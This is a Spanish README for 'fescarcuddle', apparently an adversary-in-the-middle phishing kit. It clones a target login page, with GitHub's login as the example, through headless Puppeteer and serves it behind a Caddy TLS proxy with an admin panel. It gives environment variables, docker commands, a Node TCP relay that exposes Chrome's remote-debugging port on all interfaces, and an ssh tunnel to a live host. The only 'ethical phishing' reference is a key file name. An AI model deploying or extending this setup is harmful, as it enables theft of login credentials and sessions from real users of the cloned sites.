# fescarcuddle

## Requisitos previos

Antes de levantar el stack hay que definir al menos una variable de entorno en el host (o en un archivo `.env`):

### Variables de entorno

| Variable | Obligatoria | Descripción |
|----------|-------------|-------------|
| `TARGET_URL` | **Sí** | URL del sitio que se clonará/añadirá como target. Al arrancar, `add_target.js` la usa para crear el target en MongoDB antes de iniciar el servidor. |
| `TARGET_LANGUAGE` | No | Accept-Language que se pasará al navegador headless (ej. `es-419,es;q=0.9,en;q=0.8`). Por defecto usa ese mismo valor. |
| `TARGET_NAME` | No | Nombre del target en MongoDB que debe usar el servidor pescador. Si no se especifica, usa el primer target disponible. Si se especifica un nombre que no existe en la base de datos, el proceso termina con error. |
| `PUPPETEER_DEBUG` | No | Si se establece en `true`, habilita depuración remota de Puppeteer en `9222` (`--remote-debugging-address=0.0.0.0` y `--remote-debugging-port=9222`). |

### Ejemplo de uso

```bash
export TARGET_URL="https://github.com/login/"
export TARGET_LANGUAGE="es-419,es;q=0.9,en;q=0.8"   # opcional
export TARGET_NAME="github"                         # opcional
export PUPPETEER_DEBUG=true                          # opcional

    # elimina los anónimos viejos (~1GB)
docker compose down && docker volume prune -f && docker compose up -d && docker compose logs debug-server pescador  -f
```

### Para debugging
```bash
docker compose exec -d pescador node -e "const net=require('net');const fs=require('fs');const log=(m)=>fs.appendFileSync('/tmp/relay9333.log',new Date().toISOString()+' '+m+'\n');const srv=net.createServer((s)=>{const t=net.connect(9222,'127.0.0.1');t.on('connect',()=>log('upstream connected'));t.on('error',(e)=>{log('upstream error '+e.message);s.destroy();});s.on('error',(e)=>{log('client error '+e.message);t.destroy();});s.pipe(t);t.pipe(s);});srv.listen(9333,'0.0.0.0',()=>log('relay listening'));"
docker compose exec pescador sh -c 'tail -n 50 /tmp/relay9333.log'

CIP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pescador); echo "$CIP"
curl -sv "http://$CIP:9333/json/version"
```

```bash
ssh -i .\ESP-ethical-phishing-ec2instance.pem -N -L 9222:172.18.0.6:9333 admin@x1-x.com
chrome://inspect/#devices
Discover network targets
127.0.0.1:9222
```




O con un archivo `.env` en la raíz del proyecto:

```env
TARGET_URL=https://example.com
TARGET_LANGUAGE=es-419,es;q=0.9,en;q=0.8
TARGET_NAME=mi-target
PUPPETEER_DEBUG=false
```

## Flujo de arranque

1. `entrypoint.sh` detecta si `TARGET_URL` está definida.
2. Si lo está, ejecuta `add_target.js` para guardar el target en MongoDB.
3. Una vez guardado, arranca `index.js` (servidor Fastify + Socket.IO).
4. El servidor carga el target indicado por `TARGET_NAME` (o el primero disponible) y abre el navegador headless apuntando a él.

## Panel de administración

Accesible en `https://pescador.x1-x.com/admin`.

Requiere que tu IP esté en la lista `admin_ips` de [pescador/config.json](pescador/config.json).

## Servicios

| Servicio | Puerto interno | Descripción |
|----------|---------------|-------------|
| `caddy` | 80 / 443 | Reverse proxy y terminación TLS |
| `pescador` | 58082 | Servidor principal (Fastify + Puppeteer) |
| `browser-front` | 3001 | Frontend del panel de control |
| `debug-server` | 8081 | Servidor de eventos de navegación |
| `mongodb` | 27017 | Base de datos |
